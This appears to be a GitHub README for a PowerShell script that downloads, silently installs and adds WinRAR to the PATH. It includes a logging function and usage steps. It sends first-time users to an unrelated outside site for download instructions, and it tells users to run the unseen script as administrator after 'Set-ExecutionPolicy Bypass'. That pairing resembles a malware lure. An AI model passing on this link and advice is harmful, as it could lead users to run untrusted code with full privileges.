# WinRAR Auto-Installer Script

This PowerShell script automates the process of downloading, installing, and adding WinRAR to the system PATH on Windows machines.

## how to download the repo first time users

  - click link to read [**Instructions**](https://www.fnbubbles420.org/Instructions-On-How-To-Download-Repo)

## Features

- **Automated Download**: Downloads the WinRAR installer directly from the official website.
- **Silent Installation**: Installs WinRAR silently without requiring user interaction.
- **PATH Update**: Adds the WinRAR installation directory to the system PATH if it's not already present, allowing WinRAR commands to be run from anywhere in the command line.


# WinRAR Silent Installer Script - Logging Information

This PowerShell script automates the process of downloading and installing WinRAR silently on a Windows system. It includes robust logging mechanisms to ensure detailed tracking of the script's operations and troubleshooting.

## Logging

The script logs all actions and errors to a log file located in the temporary directory. The log file is named `winrar-install.log`.

### Log File Location

The log file is saved in the user's temporary directory. The typical path is:

```
C:\Users<YourUsername>\AppData\Local\Temp\winrar-install.log
```

### Logging Function

The script includes a custom function `Log-Message` to handle logging. This function logs messages with a timestamp and a message type (INFO, ERROR, or WARNING).

#### Log-Message Function Definition

```powershell
function Log-Message {
    param (
        [string]$message,
        [string]$type = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp [$type] $message"
    Write-Host $logEntry
    Add-Content -Path $logFile -Value $logEntry
}
```

Parameters
- `message:` The message to log.
- `type:` The type of message (INFO, ERROR, WARNING). The default is "INFO".

## Example Log Entries
- Info Message
```
2024-07-18 14:32:01 [INFO] Starting download of WinRAR from https://www.win-rar.com/fileadmin/winrar-versions/winrar-x64-701.exe
```

- Error Message
```
2024-07-18 14:32:45 [ERROR] Failed to download WinRAR installer: Exception calling "Invoke-WebRequest" with "2" argument(s): "The remote server returned an error: (404) Not Found."
```

- Warning Message
```
2024-07-18 14:33:10 [WARNING] Failed to remove the downloaded installer: Exception calling "Remove-Item" with "1" argument(s): "Cannot find path 'C:\Users\User\AppData\Local\Temp\winrar-installer.exe' because it does not exist."
```

## Logging Steps in the Script

1. **Starting Download:** Logs the beginning of the download process.
```
Log-Message "Starting download of WinRAR from $url"
```

2. **Download Complete:** Logs the completion of the download.
```
Log-Message "Download complete."
```

3. **Download Failure:** Logs any errors during the download process.
```
Log-Message "Failed to download WinRAR installer: $_" "ERROR"
```

4. **File Verification:** Logs if the downloaded file is missing or empty.
```
Log-Message "Downloaded WinRAR installer is missing or empty." "ERROR"
```

5. **Starting Installation:** Logs the beginning of the installation process.
```
Log-Message "Starting silent installation of WinRAR."
```

6. **Installation Complete:** Logs the completion of the installation.
```
Log-Message "WinRAR installation complete."
```

7. **Installation Failure:** Logs any errors during the installation process.
```
Log-Message "Failed to install WinRAR: $_" "ERROR"
```

8. **Clean Up:** Logs the removal of the downloaded installer.
```
Log-Message "Cleaned up the downloaded installer."
```

9. **Clean Up Failure:** Logs any errors during the cleanup process.
```
Log-Message "Failed to remove the downloaded installer: $_" "WARNING"
```


## Prerequisites

- PowerShell 5.0 or higher
- Internet connection to download the installer
- Administrative privileges for installation and updating the system PATH

- You need to have PowerShell installed on your system. This is used to run the script.
- `Both` MSI are from the official github page of [Official-PowerShell-Github](https://github.com/PowerShell)

# v7.4.3 Release of PowerShell - Latest (recommended)
      choose your recommended pc specs either 32bit or 64bit 

- [64-Bit-Installer](https://github.com/PowerShell/PowerShell/releases/download/v7.4.3/PowerShell-7.4.3-win-x64.msi)
- [32-Bit-Installer](https://github.com/PowerShell/PowerShell/releases/download/v7.4.3/PowerShell-7.4.3-win-x86.msi)

## Usage

1. Open PowerShell ( **Run In Admin** )
2. Navigate to the directory containing the script. `cd` the location of the script then click enter.
3. Run the script:
   ```powershell
   .\WinRAR-7.01-auto-installer.ps1
   ```
4. The script will handle the rest, providing output messages to indicate progress and completion status.

### if usage doesnt work use this first run it then select `Y` thats it click enter then run the script again 
```
Set-ExecutionPolicy Bypass -Scope Process
```
then repeat the process you can leave powershell open in admin mode to do this you dont have to close it

## How It Works

1. **Download**: The script starts by downloading the WinRAR installer using the `Invoke-WebRequest` cmdlet. It then waits for 5 seconds to ensure the download completes.
2. **Install**: After downloading, it proceeds to install WinRAR silently using the `/S` switch. It checks if WinRAR is installed correctly by attempting to locate the WinRAR command.
3. **PATH Update**: Finally, it checks if WinRAR's installation path is in the system PATH. If not, it adds it. This allows WinRAR commands to be run from anywhere in the command line.

## Note

This script is designed for educational purposes and should be used responsibly. Ensure you have the right to install software on the machine.

## License

This script is provided "as is", without warranty of any kind, express or implied. Use it at your own risk.
